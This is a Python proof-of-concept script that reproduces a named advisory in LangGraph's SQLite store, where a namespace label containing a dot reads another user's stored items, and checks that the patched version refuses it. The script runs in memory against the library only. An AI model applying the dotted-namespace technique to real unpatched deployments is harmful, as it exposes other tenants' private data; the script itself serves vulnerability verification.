"""Reproduction: CVE-2026-115883 (GHSA-6hmw-9432-67qq), a namespace label that
contains ``.`` addresses another namespace in LangGraph's SQLite store. Fixed in
langgraph-checkpoint-sqlite 3.1.2.

Library level only: no server, no app. Run it in a SEPARATE environment that
has the store package installed.

    pip install "langgraph-checkpoint-sqlite==3.1.1"  -> exits 7 (cross-namespace read)
    pip install "langgraph-checkpoint-sqlite==3.1.2"  -> exits 0 (refused)

The ops are handed to ``batch`` directly, which is the route the fix closed.
Through a LangGraph dev server this case could not be reached in our runs: the
server's HTTP layer refuses a dotted label (HTTP 422) before the store sees it,
so ``real_server_store_gate.py`` reports the dot case as not exercised.
"""
import importlib.metadata as m
import sys

try:
    from langgraph.store.base import GetOp, SearchOp
    from langgraph.store.sqlite import SqliteStore
except Exception as exc:
    print("IMPORT-FAIL", exc)
    sys.exit(2)

print(f"langgraph-checkpoint-sqlite={m.version('langgraph-checkpoint-sqlite')} "
      f"langgraph-checkpoint={m.version('langgraph-checkpoint')}")
with SqliteStore.from_conn_string(":memory:") as store:
    store.setup()
    # User "acme" keeps a note under ("acme", "alice", "notes").
    store.put(("acme", "alice", "notes"), "k", {"text": "ACME-SECRET"})
    crossed = []
    # A different user whose id is "acme.alice" reads inside ITS OWN namespace.
    for name, op in (("search", SearchOp(("acme.alice",), None, 10, 0, None)),
                     ("get", GetOp(("acme.alice", "notes"), "k"))):
        try:
            result = store.batch([op])[0]
        except Exception as exc:
            print(f"{name}: refused ({type(exc).__name__})")
            continue
        if "ACME-SECRET" in repr(result):
            crossed.append(name)
        print(f"{name}: {'returned the other namespace item' if name in crossed else 'nothing'}")
if crossed:
    print("CROSS-NAMESPACE READ via: " + ", ".join(crossed))
    sys.exit(7)
print("ISOLATED")
sys.exit(0)
